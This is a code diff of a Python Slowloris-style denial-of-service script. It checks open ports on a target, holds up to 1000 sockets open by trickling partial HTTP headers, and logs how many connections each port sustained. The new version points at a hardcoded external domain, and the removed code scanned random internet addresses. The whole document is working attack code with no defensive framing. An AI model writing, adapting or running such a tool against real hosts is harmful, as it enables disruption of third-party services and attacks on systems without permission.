@@ -4,14 +4,16 @@ import time
 import sys
 import ssl
 import traceback
-import _thread
+import asyncio
 import sqlite3
 from os import system
 
 listOfSockets = list()
 ip = None
 port = None
-thread_kill = True
+quantityOfSockets = 1000
+maximum_connections = 0
+keep_alive = True
 user_agents = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
@@ -58,13 +60,18 @@ except:
 
 conn.commit()
 
-def portsCheck(ip):
+def portsCheck():
 
+	global ip
+
+	print('checking ports')
 	open_ports = []
+
+	print(ip)
 	for port in [80, 443, 445, 5901, 8080, 8081]:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-		s.settimeout(0.1)
+		s.settimeout(0.2)
 		try:
 			s.connect((ip, port))
 			open_ports.append(port)
@@ -73,21 +80,27 @@ def portsCheck(ip):
 
 		s.close()
 
+	print(open_ports)
+
 	return open_ports
 
 
 
-def socketInit(ip, port):
+def socketInit():
 
-	global listOfSockets
+	global ip
+	global port
 
 	while True:
 		if ip:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.settimeout(1)
-			# time.sleep(0.1)
-			s.connect((ip, port))
-			break
+			try:
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+				s.settimeout(5)
+				# time.sleep(0.1)
+				s.connect((ip, port))
+				break
+			except:
+				break
 
 		else:
 			print('Please enter an IP address!')
@@ -104,68 +117,69 @@ def socketInit(ip, port):
 	return s
 
 
-def keeping_active(quantityOfSockets, ip, port):
+async def keeping_active():
 
 	global listOfSockets
-	global thread_kill
+	global ip
+	global port
+	global keep_alive
 
 	print('Keeping active...')
 
-	while True:
+	while keep_alive:
 
-			if thread_kill:
-				break
+		print('{} sockets on {}:{} Still alive..'.format(len(listOfSockets), ip, port))
+
+		for s in listOfSockets:
 			try:
-				for s in listOfSockets:
-					try:
-						s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
-					except socket.error:
-						listOfSockets.remove(s)
-					except BrokenPipeError:
-						print('creating a new socket')
-						try:
-							s = socketInit(ip. port)
-							if s:
-								listOfSockets.append(s)
-						except:
-							break
-						continue
+				s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+			except socket.error:
+				listOfSockets.remove(s)
+				socketInit()
+				listOfSockets.append(s)
+				continue
+		
+		await asyncio.sleep(5)
 
-				time.sleep(0.5)
-
-			except:
-				break	
-
-
-
-def connection(ip, port, quantityOfSockets=1000):
-	
-	global listOfSockets
-	global thread_kill
-	global cursor
-	thread_kill = False
-	thread = not thread_kill
-
-	# if port == 443:
+	# print('AA')
+	# print('{} sockets Still alive..'.format(len(listOfSockets)))
+	# for s in listOfSockets:
 	# 	try:
-	# 		f = open('cert.pem', 'r')
-	# 		f.close()
-	# 	except:
-	# 		create_openSSL()
+	# 		s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+	# 	except socket.error:
+	# 		listOfSockets.remove(s)
+	# 		continue
+	
+	# await asyncio.sleep(5)
 
 
+
+
+
+
+async def connection():
+
+	global ip
+	global port
+	global quantityOfSockets
+	global listOfSockets
+	global maximum_connections
+	global keep_alive
+
+	keep_alive = True
 
 	for _ in range(quantityOfSockets):
 		try:
-			s = socketInit(ip, port)
-			# if port == 443:
-				# s = ssl.wrap_socket(s, 'cert.pem', 'cert.pem')
+			s = socketInit()
 
+			if len(listOfSockets) % 100 == 0:
+				print(len(listOfSockets))
+				await asyncio.sleep(0.01)
+
+			# print(s)
 		except socket.timeout:
 			break
 		except BrokenPipeError:
-			# print('Error with data: IP - {} Port - {} Socket Index - {}'.format(ip, port, len(listOfSockets)))
-			# print('BrokenPipeError: perhaps server closed a port or something with a socket')
 			continue
 		except KeyboardInterrupt:
 			for s in listOfSockets:
@@ -173,18 +187,16 @@ def connection(ip, port, quantityOfSockets=1000):
 				listOfSockets.remove(s)
 				break
 		except:
-			# print('Error with data: IP - {} Port - {} Socket Index - {}'.format(ip, port, len(listOfSockets)))
-			# print(traceback.format_exc())
 			continue
 
 		listOfSockets.append(s)
 
-		# if len(listOfSockets) > 100 and thread:
-		# 	thr = _thread.start_new_thread(keeping_active, (quantityOfSockets, ip, port, ) )
-		# 	thread = False
 
-	thread_kill = True
-	# time.sleep(0.1)
+	# while len(listOfSockets) < quantityOfSockets:
+	# 	try:
+	# 		s = socketInit()
+	# 	except socket.timeout:
+	# 		break
 
 	result = len(listOfSockets)
 
@@ -194,70 +206,105 @@ def connection(ip, port, quantityOfSockets=1000):
 
 	listOfSockets = []
 
-	return result
+	keep_alive = False
+
+	maximum_connections = result
+
+
 
 def rand_ip():
 	random_ip = '{}.{}.{}.{}'.format(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
 	return random_ip
+
+
+async def main_loop():
+
+
+	task1 = asyncio.create_task(connection())
+	task2 = asyncio.create_task(keeping_active())
+
+	await asyncio.gather(task1, task2)
 
 	
 
 
 if __name__ == "__main__":
 
-	# try:
-	# 	ip = sys.argv[1]
-	# except:
-	# 	ip = input('IP: ')
 
-	maximum_sockets = 1000
-	print('Scaning...')
-	counter = 0
-	db_txt = open('db.txt', 'a+')
+	ip = 'marcozo.com'
 
-	while True:
-		if counter == 0:
-			db_txt.close()
-			conn.commit()
-			db_txt = open('db.txt', 'a+')
+	ports = portsCheck()
+	
+	for p in ports:
+		
+		port = p
 
-		try:
-			ip = rand_ip()
+		asyncio.run(main_loop())
 
-			ports = portsCheck(ip)
 
-			for port in ports:
-				print('Scaning IP: {} Port: {}'.format(ip, port))
-				count = connection(ip, port, maximum_sockets)
-				print('End of {}:{} scanning'.format(ip, port))
-				if count == maximum_sockets:
-					count = '>'+str(count) 
-				try:
-					cursor.execute("INSERT INTO checked_ip (ip_address, port, maximum_connections) VALUES (?, ?, ?)", (ip, str(port), str(count)))
-					db_txt.write('{} {} {}'.format(ip, port, count))
-					print('IP - {}, Port - {}, Conn - {}'.format(ip, port, count))
-					conn.commit()
-				except:
-					pass
+		cursor.execute("INSERT INTO checked_ip (ip_address, port, maximum_connections) VALUES (?, ?, ?)", (ip, str(port), str(maximum_connections)))
+		print('IP - {}, Port - {}, Conn - {}'.format(ip, port, maximum_connections))
+		conn.commit()
+		db_txt = open('db.txt', 'a+')
+		db_txt.write('{} {} {}\n'.format(ip, port, maximum_connections))
+		db_txt.close()
 
-		except KeyboardInterrupt:
+		maximum_connections = 0
+
+
+	cursor.close()
+
+
+
+	# print('Scaning...')
+	# counter = 0
+	# db_txt = open('db.txt', 'a+')
+
+	# while True:
+	# 	if counter == 0:
+	# 		db_txt.close()
+	# 		conn.commit()
+	# 		db_txt = open('db.txt', 'a+')
+
+	# 	try:
+	# 		# ip = rand_ip()
+	# 		ip = '127.0.0.1'
+
+	# 		ports = portsCheck(ip)
+
+	# 		for p in ports:
+	# 			port = p
+	# 			print('Scaning IP: {} Port: {}'.format(ip, port))
+	# 			count = connection(ip, port, maximum_sockets)
+	# 			print('End of {}:{} scanning'.format(ip, port))
+	# 			if count == maximum_sockets:
+	# 				count = '>'+str(count) 
+	# 			try:
+	# 				cursor.execute("INSERT INTO checked_ip (ip_address, port, maximum_connections) VALUES (?, ?, ?)", (ip, str(port), str(count)))
+	# 				db_txt.write('{} {} {}'.format(ip, port, count))
+	# 				print('IP - {}, Port - {}, Conn - {}'.format(ip, port, count))
+	# 				conn.commit()
+	# 			except:
+	# 				pass
+
+	# 	except KeyboardInterrupt:
 			
-			conn.commit()
+	# 		conn.commit()
 			
-			cursor.execute("SELECT * from checked_ip")
-			results = cursor.fetchall()
-			for i in results:
-				ip, port, conn = i
-				print('{} - {} - {}'.format(ip, port, conn))
-			cursor.close()
-			break
-		except:
-			print(traceback.format_exc())
-			continue
-		if counter != 10:
-			counter += 1
-		else:
-			counter = 0
+	# 		cursor.execute("SELECT * from checked_ip")
+	# 		results = cursor.fetchall()
+	# 		for i in results:
+	# 			ip, port, conn = i
+	# 			print('{} - {} - {}'.format(ip, port, conn))
+	# 		cursor.close()
+	# 		break
+	# 	except:
+	# 		print(traceback.format_exc())
+	# 		continue
+	# 	if counter != 10:
+	# 		counter += 1
+	# 	else:
+	# 		counter = 0
 
 
 
